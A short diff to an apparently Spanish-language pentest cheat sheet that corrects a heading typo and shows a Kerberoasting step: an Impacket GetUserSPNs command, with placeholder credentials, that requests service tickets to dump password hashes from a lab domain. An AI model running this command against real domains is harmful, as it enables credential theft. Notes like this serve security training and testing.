@@ -11,7 +11,7 @@ Ejemplo:
 192.168.214.149 wizcorp.local wizcorp DC-Company
 ```
 
-# Efectuar ataque con GetUsersSPNs
+# Efectuar ataque con GetUserSPNs
 Este ataque nos permite dumpear el hash de los usuarios que sean vulnerables.
 ```
 python GetUsersSPNs.py <DOMINIO>/<usuario>:<contraseña> -dc-ip <ip_DC> -request
